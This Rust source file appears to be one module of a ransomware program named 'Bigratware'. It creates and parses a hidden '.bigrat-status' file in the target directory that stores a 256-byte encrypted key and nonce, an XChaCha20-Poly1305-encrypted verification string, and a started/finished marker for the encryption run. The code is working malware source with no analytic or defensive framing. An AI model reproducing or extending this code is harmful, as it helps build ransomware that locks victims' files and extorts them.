use std::fs::{File, OpenOptions};
use std::io::{self, Read, Seek, SeekFrom, Write};
use std::path::Path;
use anyhow::{anyhow, Context};
use chacha20poly1305::aead::stream::EncryptorBE32;
use chacha20poly1305::{KeyInit, XChaCha20Poly1305};
use crate::BIGRAT_PNG;
use crate::encryptor::{STATUS_VERIFY_ENCRYPTED_STR_LEN, STATUS_VERIFY_STR};

#[cfg(windows)]
use std::os::windows::fs::OpenOptionsExt;

pub fn create_status_file(
    path: &Path,
    encrypted_key: &[u8],
    encrypted_nonce: &[u8],
    key: &[u8; 32],
    nonce: &[u8; 19],
) -> anyhow::Result<File> {
    let err_context = || "Failed to create a status file";
    #[cfg(not(windows))]
        let mut status_file = OpenOptions::new()
        .write(true)
        .create(true)
        .open(path.join(".bigrat-status"))
        .with_context(err_context)?;
    #[cfg(windows)]
        let mut status_file = OpenOptions::new()
        .write(true)
        .create(true)
        .attributes(0x2)  // hidden file
        .open(path.join(".bigrat-status"))
        .with_context(err_context)?;
    status_file.write_all(BIGRAT_PNG).with_context(err_context)?;
    status_file.write_all(encrypted_key).with_context(err_context)?;
    status_file.write_all(encrypted_nonce).with_context(err_context)?;

    let aead = XChaCha20Poly1305::new(key.into());
    let stream_encryptor = EncryptorBE32::from_aead(aead, nonce.as_ref().into());
    let encrypted_verify_str = stream_encryptor
        .encrypt_last(STATUS_VERIFY_STR.as_slice())
        .map_err(|err| anyhow!("Failed to encrypt status verification text: {err}"))?;
    assert_eq!(
        STATUS_VERIFY_ENCRYPTED_STR_LEN,
        encrypted_verify_str.len(),
        "Length of the encrypted status verification text ({}) does not match the expected length ({}). \
        Did you change it in the source code?",
        encrypted_verify_str.len(),
        STATUS_VERIFY_ENCRYPTED_STR_LEN,
    );
    status_file.write_all(&encrypted_verify_str).with_context(err_context)?;

    status_file.write_all(b"BIGRATWARE_STATUS=started;").with_context(err_context)?;

    Ok(status_file)
}


#[derive(Debug, Clone)]
pub enum Status {
    Started,
    Finished,
}

#[derive(Debug, Clone)]
pub struct StatusData {
    pub status: Status,
    pub encrypted_verify_str: [u8; STATUS_VERIFY_ENCRYPTED_STR_LEN],
    pub encrypted_key: [u8; 256],
    pub encrypted_nonce: [u8; 256],
}

impl Default for StatusData {
    fn default() -> Self {
        Self {
            status: Status::Started,
            encrypted_verify_str: [0; STATUS_VERIFY_ENCRYPTED_STR_LEN],
            encrypted_key: [0u8; 256],
            encrypted_nonce: [0u8; 256],
        }
    }
}

#[derive(Debug)]
pub enum StatusReadError {
    IoError(io::Error),
    DoesNotExist,
    Invalid(String),
}

impl From<io::Error> for StatusReadError {
    fn from(value: io::Error) -> Self {
        Self::IoError(value)
    }
}

/// Get encrypted key, encrypted nonce and status of the encryption process
/// (started or finished) from a `$working_path/.bigrat-status` file
pub fn get_status_data(working_path: &Path) -> core::result::Result<StatusData, StatusReadError> {
    let status_file_path = working_path.join(".bigrat-status");
    if !status_file_path.exists() {
        return Err(StatusReadError::DoesNotExist);
    }
    let mut status_file = File::open(status_file_path)?;
    if status_file.metadata()?.len() <= BIGRAT_PNG.len() as u64 + 512 {
        return Err(StatusReadError::Invalid("File is smaller then expected".to_string()));
    }
    status_file.seek(SeekFrom::Start((BIGRAT_PNG.len() + 512 + STATUS_VERIFY_ENCRYPTED_STR_LEN) as u64))?;

    let mut status = String::new();
    status_file.read_to_string(&mut status)?;
    let mut statuses = status.split(';')
        .map(|s| s.strip_prefix("BIGRATWARE_STATUS=").unwrap_or(""))
        .collect::<Vec<&str>>();
    statuses.pop();
    let status = match statuses.last() {
        None => return Err(StatusReadError::Invalid("No actual status string found".to_string())),
        Some(&"started") => Status::Started,
        Some(&"finished") => Status::Finished,
        Some(val) => return Err(StatusReadError::Invalid(format!("Unrecognized status: {val}"))),
    };

    status_file.seek(SeekFrom::Start(BIGRAT_PNG.len() as u64))?;
    let mut encrypted_key = [0u8; 256];
    let _ = status_file.read(&mut encrypted_key)?;
    let mut encrypted_nonce = [0u8; 256];
    let _ = status_file.read(&mut encrypted_nonce)?;
    let mut encrypted_verify_str = [0u8; STATUS_VERIFY_ENCRYPTED_STR_LEN];
    let _ = status_file.read(&mut encrypted_verify_str)?;

    Ok(StatusData {
        status,
        encrypted_verify_str,
        encrypted_key,
        encrypted_nonce,
    })
}
